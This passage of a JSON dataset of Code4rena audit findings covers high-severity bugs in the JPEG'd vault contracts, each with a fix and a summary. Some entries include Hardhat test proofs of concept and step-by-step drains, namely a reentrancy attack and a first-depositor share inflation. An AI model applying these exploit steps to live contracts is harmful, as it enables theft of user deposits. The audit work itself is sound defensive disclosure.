      "summary": "\nThis bug report is about a vulnerability in the yVaultLPFarming contract, which is part of the code-423n4/2022-04-jpegd project. This vulnerability can cause the accruals in yVaultLPFarming to fail if the currentBalance is lower than the previousBalance in the _computeUpdate function. This can be triggered by decreasing the vault.balanceOfJPEG() when setting a new controller on a vault. This means that no funds can be withdrawn anymore.\n\nIn order to mitigate this vulnerability, it is recommended to set a new controller on a vault very carefully, and to do so with a migration.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/80",
      "tags": [
        "Overflow/Underflow",
        "Admin"
      ],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1911",
      "title": "[H-05] yVaultLPFarming: No guarantee JPEG currentBalance > previousBalance",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/yVaultLPFarming.sol#L169-L170\n\n\n## Vulnerability details\n\n## Details & Impact\n\nyVault users participating in the farm have to trust that:\n\n- `vault.balanceOfJPEG()`  returns the correct claimable JPEG amount by its strategy / strategies\n- the strategy / strategies will send all claimable JPEG to the farm\n\nShould either of these assumptions break, then it could be possibly be the case that `currentBalance` is less than `previousBalance`, causing deposits and crucially, withdrawals to fail due to subtraction overflow.\n\n## Proof of Concept\n\nFor instance, \n\n- Farm migration occurs. A new farm is set in `yVault`, then `withdrawJPEG()` is called, which sends funds to the new farm. Users of the old farm would be unable to withdraw their deposits.\n\n```jsx\nit.only(\"will revert old farms' deposits and withdrawals if yVault migrates farm\", async () => {\n  // 0. setup\n  await token.mint(owner.address, units(1000));\n  await token.approve(yVault.address, units(1000));\n  await yVault.depositAll();\n  await yVault.approve(lpFarming.address, units(1000));\n  // send some JPEG to strategy prior to deposit\n  await jpeg.mint(strategy.address, units(100));\n  // deposit twice, so that the second deposit will invoke _update()\n  await lpFarming.deposit(units(250));\n  await lpFarming.deposit(units(250));\n\t\n  // 1. change farm and call withdrawJPEG()\n  await yVault.setFarmingPool(user1.address);\n  await yVault.withdrawJPEG();\n\t\n  // deposit and withdrawal will fail\n  await expect(lpFarming.deposit(units(500))).to.be.revertedWith('reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)');\n  await expect(lpFarming.withdraw(units(500))).to.be.revertedWith('reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)');\n});\n```\n\n- Strategy migration occurs, but JPEG funds held by the old strategy were not claimed, causing `vault.balanceOfJPEG()` to report a smaller amount than previously recorded\n- `jpeg` could be accidentally included in the StrategyConfig, resulting in JPEG being converted to other assets\n- A future implementation takes a fee on the `jpeg` to be claimed\n\n## Recommended Mitigation Steps\n\nA simple fix would be to `return` if `currentBalance ≤ previousBalance`. A full fix would properly handle potential shortfall.\n\n```jsx\nif (currentBalance <= previousBalance) return;\n```",
      "summary": "\nThis bug report is about a vulnerability that affects users of the yVault platform. It is possible that the balance of JPEG tokens returned by the platform's strategy/strategies is incorrect, which could cause deposits and withdrawals to fail due to subtraction overflow. A proof of concept is provided that demonstrates how this could happen if a farm migration or strategy migration occurs. It is also possible that JPEG tokens could be accidentally included in the StrategyConfig or a fee could be taken on the JPEG tokens to be claimed in the future. The recommended mitigation step is to add a line of code that returns if the current balance is less than the previous balance.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/56",
      "tags": [],
      "finders": [
        "hickuphh3"
      ]
    },
    {
      "id": "1910",
      "title": "[H-04] Reentrancy issue in yVault.deposit",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L144-L145\n\n\n## Vulnerability details\n\n## Impact\nIn `deposit`, the balance is cached and then a `token.transferFrom` is triggered which can lead to exploits if the `token` is a token that gives control to the sender, like ERC777 tokens.\n\n#### POC\nInitial state: `balance() = 1000`, shares `supply = 1000`.\nDepositing 1000 amount should mint 1000 supply, but one can split the 1000 amounts into two 500 deposits and use re-entrancy to profit.\n\n- Outer `deposit(500)`: `balanceBefore = 1000`. Control is given to attacker ...\n- Inner `deposit(500)`: `balanceBefore = 1000`. `shares = (_amount * supply) / balanceBefore = 500 * 1000 / 1000 = 500` shares are minted ...\n- Outer `deposit(500)` continues with the mint: `shares = (_amount * supply) / balanceBefore = 500 * 1500 / 1000 = 750` are minted.\n- Withdrawing the `500 + 750 = 1250` shares via `withdraw(1250)`, the attacker receives `backingTokens = (balance() * _shares) / supply = 2000 * 1250 / 2250 = 1111.111111111`. The attacker makes a profit of `1111 - 1000 = 111` tokens.\n- They repeat the attack until the vault is drained.\n\n## Recommended Mitigation Steps\nThe `safeTransferFrom` should be the last call in `deposit`.",
      "summary": "\nThis bug report is about an exploit in the yVault contract. When the deposit function is triggered, the balance is cached and then a token.transferFrom is triggered which can lead to exploits if the token is a token that gives control to the sender, like ERC777 tokens. An example of this exploit is if the balance is 1000 and 1000 is deposited, the attacker can split the 1000 into two 500 deposits and use re-entrancy to profit. This would allow them to withdraw 1250 shares and receive 1111.111111111 tokens, which is a profit of 111 tokens. To mitigate this exploit, it is recommended that the safeTransferFrom should be the last call in the deposit function.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/81",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1909",
      "title": "[H-03] Update initializer modifier to prevent reentrancy during initialization",
      "impact": "HIGH",
      "content": "_Submitted by Dravee_\n\n[package.json#L18-L19](https://github.com/code-423n4/2022-04-jpegd/blob/main/package.json#L18-L19)<br>\n\nThe solution uses:\n\n```jsx\n    \"@openzeppelin/contracts\": \"^4.0.0\",\n    \"@openzeppelin/contracts-upgradeable\": \"^4.3.2\",\n```\n\nThese dependencies have a known high severity vulnerability:\n\n*   <https://security.snyk.io/vuln/SNYK-JS-OPENZEPPELINCONTRACTSUPGRADEABLE-2320177>\n*   <https://snyk.io/test/npm/@openzeppelin/contracts-upgradeable/4.3.2#SNYK-JS-OPENZEPPELINCONTRACTSUPGRADEABLE-2320177>\n*   <https://snyk.io/test/npm/@openzeppelin/contracts/4.0.0#SNYK-JS-OPENZEPPELINCONTRACTS-2320176>\n\nWhich makes these contracts vulnerable:\n\n```jsx\ncontracts/helpers/CryptoPunksHelper.sol:\n  19:     function initialize(address punksAddress) external initializer {\n\ncontracts/helpers/EtherRocksHelper.sol:\n  19:     function initialize(address rocksAddress) external initializer {\n\ncontracts/staking/JPEGStaking.sol:\n  21:     function initialize(IERC20Upgradeable _jpeg) external initializer {\n\ncontracts/vaults/FungibleAssetVaultForDAO.sol:\n  71:     ) external initializer {\n\ncontracts/vaults/NFTVault.sol:\n  149:     ) external initializer {\n```\n\n### Recommended Mitigation Steps\n\nUpgrade `@openzeppelin/contracts` and `@openzeppelin/contracts-upgradeable` to version 4.4.1 or higher.\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with High severity](https://github.com/code-423n4/2022-04-jpegd-findings/issues/227)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/227#issuecomment-1099246138):**\n > Fixed in [jpegd/core#11](https://github.com/jpegd/core/pull/11).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the solution which uses the dependencies \"@openzeppelin/contracts\" and \"@openzeppelin/contracts-upgradeable\" in version 4.0.0 and 4.3.2 respectively. This vulnerability is of high severity and can affect the contracts CryptoPunksHelper.sol, EtherRocksHelper.sol, JPEGStaking.sol, FungibleAssetVaultForDAO.sol, and NFTVault.sol. \n\nThe recommended mitigation step is to upgrade the dependencies to version 4.4.1 or higher. This will ensure that the contracts are no longer vulnerable to the high severity bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/227",
      "tags": [],
      "finders": [
        "Dravee"
      ]
    },
    {
      "id": "1908",
      "title": "[H-02] Existing user’s locked JPEG could be overwritten by new user, causing permanent loss of JPEG funds",
      "impact": "HIGH",
      "content": "_Submitted by hickuphh3, also found by 0x1f8b, AuditsAreUS, Foundation, Kthere, Meta0xNull, rayn, and WatchPug_\n\n[NFTVault.sol#L375](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L375)<br>\n[JPEGLock.sol#L54-L62](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/lock/JPEGLock.sol#L54-L62)<br>\n\nA user’s JPEG lock schedule can be overwritten by another user’s if he (the other user) submits and finalizes a proposal to change the same NFT index’s value.\n\nThe existing user will be unable to withdraw his locked JPEGs, resulting in permanent lock up of JPEG in the locker contract.\n\n### Proof of Concept\n\n1.  `user` successfully proposes and finalizes a proposal to change his NFT’s collateral value\n2.  Another user (`owner`) does the same for the same NFT index\n3.  `user` will be unable to withdraw his locked JPEG because schedule has been overwritten\n\nInsert this test case into [`NFTVault.ts`](https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/NFTVault.ts).\n\n```jsx\nit.only(\"will overwrite existing user's JPEG lock schedule\", async () => {\n  // 0. setup\n  const index = 7000;\n  await erc721.mint(user.address, index);\n  await nftVault\n    .connect(dao)\n    .setPendingNFTValueETH(index, units(50));\n  await jpeg.transfer(user.address, units(150000));\n  await jpeg.connect(user).approve(locker.address, units(500000));\n  await jpeg.connect(owner).approve(locker.address, units(500000));\n\n  // 1. user has JPEG locked for finalization\n  await nftVault.connect(user).finalizePendingNFTValueETH(index);\n\n  // 2. owner submit proposal to further increase NFT value\n  await nftVault\n    .connect(dao)\n    .setPendingNFTValueETH(index, units(100));\n  \n  // 3. owner finalizes, has JPEG locked\n  await nftVault.connect(owner).finalizePendingNFTValueETH(index);\n\n  // user schedule has been overwritten\n  let schedule = await locker.positions(index);\n  expect(schedule.owner).to.equal(owner.address);\n\n  // user tries to unstake\n  // wont be able to because schedule was overwritten\n  await timeTravel(days(366));\n  await expect(locker.connect(user).unlock(index)).to.be.revertedWith(\"unauthorized\");\n});\n```\n\n### Recommended Mitigation Steps\n\n1.  Release the tokens of the existing schedule. Simple and elegant.\n\n```jsx\n// in JPEGLock#lockFor()\nLockPosition memory existingPosition = positions[_nftIndex];\nif (existingPosition.owner != address(0)) {\n  // release jpegs to existing owner\n  jpeg.safeTransfer(existingPosition.owner, existingPosition.lockAmount);\n}\n```\n\n2.  Revert in `finalizePendingNFTValueETH()` there is an existing lock schedule. This is less desirable IMO, as there is a use-case for increasing / decreasing the NFT value.\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/10)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/10#issuecomment-1099232121):**\n > Fixed in [jpegd/core#3](https://github.com/jpegd/core/pull/3).\n\n\n\n***\n\n",
      "summary": "\nThis bug report describes a vulnerability in the JPEGLock and NFTVault contracts which can cause a user's JPEG lock schedule to be overwritten by another user if the other user submits and finalizes a proposal to change the same NFT index's value. The existing user will be unable to withdraw their locked JPEGs, resulting in a permanent lock up of JPEGs in the locker contract. The bug report includes a proof of concept to demonstrate the vulnerability.\n\nTwo mitigation steps are recommended in the bug report. The first mitigation step is to release the tokens of the existing schedule. This can be achieved by adding a simple code snippet in the JPEGLock#lockFor() function. The second mitigation step is to revert in the finalizePendingNFTValueETH() function if there is an existing lock schedule. This is less desirable, as there is a use case for increasing or decreasing the NFT value.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/10",
      "tags": [],
      "finders": [
        "hickuphh3",
        "Meta0xNull",
        "WatchPug",
        "rayn",
        "AuditsAreUS",
        "Foundation",
        "0x1f8b",
        "Kthere"
      ]
    },
    {
      "id": "1907",
      "title": "[H-01] yVault: First depositor can break minting of shares",
      "impact": "HIGH",
      "content": "_Submitted by hickuphh3, also found by 0xDjango, berndartmueller, cmichel, hyh, and WatchPug_\n\n[yVault.sol#L148-L153](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L148-L153)<br>\n\nThe attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719\\_ToB_yearn_vaultsv2/ToB\\_-\\_Yearn_Vault_v\\_2\\_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.\n\n### Proof of Concept\n\n*   Attacker deposits 1 wei to mint 1 share\n*   Attacker transfers exorbitant amount to the `StrategyPUSDConvex` contract to greatly inflate the share’s price. Note that the strategy deposits its entire balance into Convex when its `deposit()` function is called.\n*   Subsequent depositors instead have to deposit an equivalent sum to avoid minting 0 shares. Otherwise, their deposits accrue to the attacker who holds the only share.\n\nInsert this test into [`yVault.ts`](https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/yVault.ts).\n\n```jsx\nit.only(\"will cause 0 share issuance\", async () => {\n  // mint 10k + 1 wei tokens to user1\n  // mint 10k tokens to owner\n  let depositAmount = units(10_000);\n  await token.mint(user1.address, depositAmount.add(1));\n  await token.mint(owner.address, depositAmount);\n  // token approval to yVault\n  await token.connect(user1).approve(yVault.address, 1);\n  await token.connect(owner).approve(yVault.address, depositAmount);\n  \n  // 1. user1 mints 1 wei = 1 share\n  await yVault.connect(user1).deposit(1);\n  \n  // 2. do huge transfer of 10k to strategy\n  // to greatly inflate share price (1 share = 10k + 1 wei)\n  await token.connect(user1).transfer(strategy.address, depositAmount);\n  \n  // 3. owner deposits 10k\n  await yVault.connect(owner).deposit(depositAmount);\n  // receives 0 shares in return\n  expect(await yVault.balanceOf(owner.address)).to.equal(0);\n\n  // user1 withdraws both his and owner's deposits\n  // total amt: 20k + 1 wei\n  await expect(() => yVault.connect(user1).withdrawAll())\n    .to.changeTokenBalance(token, user1, depositAmount.mul(2).add(1));\n});\n```\n\n### Recommended Mitigation Steps\n\n*   [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution.\n*   Ensure the number of shares to be minted is non-zero: `require(_shares != 0, \"zero shares minted\");`\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with High severity](https://github.com/code-423n4/2022-04-jpegd-findings/issues/12)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/12#issuecomment-1099249025):**\n > Fixed in [jpegd/core#16](https://github.com/jpegd/core/pull/16).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the yVault contract, which is part of the 2022-04-jpegd repository on Github. The vulnerability is similar to TOB-YEARN-003, where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”. To demonstrate the vulnerability, the report provides a proof of concept which involves an attacker depositing 1 wei to mint 1 share, transferring an exorbitant amount to the StrategyPUSDConvex contract to inflate the share’s price, and then having subsequent depositors deposit an equivalent sum to avoid minting 0 shares. This will allow the attacker to accrue all of the deposits. \n\nThe report then provides two recommended mitigation steps to solve this problem. The first is to send the first 1000 LP tokens to the zero address, as was done in the Uniswap V2 contract. The second is to ensure that the number of shares to be minted is non-zero. Both of these steps should be implemented to prevent this vulnerability from occurring.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/12",
      "tags": [
        "First Depositor Issue"
      ],
      "finders": [
        "cmichel",
        "hickuphh3",
        "0xDjango",
        "WatchPug",
        "berndartmueller",
        "hyh"
      ]
    }
  ]
}